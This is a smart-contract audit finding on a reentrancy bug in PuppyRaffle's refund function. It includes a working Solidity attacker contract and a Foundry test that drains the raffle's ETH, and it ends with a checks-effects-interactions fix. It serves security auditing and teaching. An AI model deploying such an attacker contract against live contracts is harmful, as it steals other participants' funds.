Title: Reentrancy in `refund` allows an entrant to drain raffle funds
Impact: High
Likelihood: High
Scope: `src/PuppyRaffle.sol`

# Root + Impact

## Description

Players can call `refund` to receive their entrance fee back and be removed from the active player list.

The function sends ETH to `msg.sender` before clearing the player entry from storage. A malicious contract can reenter `refund` from its receive hook while `players[playerIndex]` still equals the attack contract, allowing the same ticket to be refunded repeatedly.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // @> External call happens before the player is marked refunded.
    payable(msg.sender).sendValue(entranceFee);

    // @> State is updated too late.
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

## Risk

**Likelihood**:

* Any contract player can enter the raffle and call `refund`.

* `sendValue` forwards all available gas, so the receiver can execute arbitrary logic and reenter the raffle.

**Impact**:

* A malicious entrant can drain ETH paid by other raffle participants.

* The raffle can become insolvent, preventing fair prize payout and refunds.

## Proof of Concept

Add the following test contract and test to `test/PuppyRaffleTest.t.sol`:

```solidity
contract ReentrantRefundAttacker {
    PuppyRaffle public raffle;
    uint256 public index;
    uint256 public entranceFee;

    constructor(PuppyRaffle _raffle, uint256 _entranceFee) {
        raffle = _raffle;
        entranceFee = _entranceFee;
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
        index = raffle.getActivePlayerIndex(address(this));
        raffle.refund(index);
    }

    receive() external payable {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(index);
        }
    }
}

function testRefundReentrancyDrainsRaffle() public {
    address[] memory honestPlayers = new address[](4);
    honestPlayers[0] = address(11);
    honestPlayers[1] = address(12);
    honestPlayers[2] = address(13);
    honestPlayers[3] = address(14);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(honestPlayers);

    ReentrantRefundAttacker attacker = new ReentrantRefundAttacker(puppyRaffle, entranceFee);
    attacker.attack{value: entranceFee}();

    assertEq(address(puppyRaffle).balance, 0);
    assertGt(address(attacker).balance, entranceFee);
}
```

The attacker paid one entrance fee but receives multiple refunds before their slot is cleared.

## Recommended Mitigation

Apply checks-effects-interactions and optionally add a reentrancy guard.

```diff
 function refund(uint256 playerIndex) public {
     address playerAddress = players[playerIndex];
     require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
     require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+
     payable(msg.sender).sendValue(entranceFee);
-
-    players[playerIndex] = address(0);
-    emit RaffleRefunded(playerAddress);
 }
```
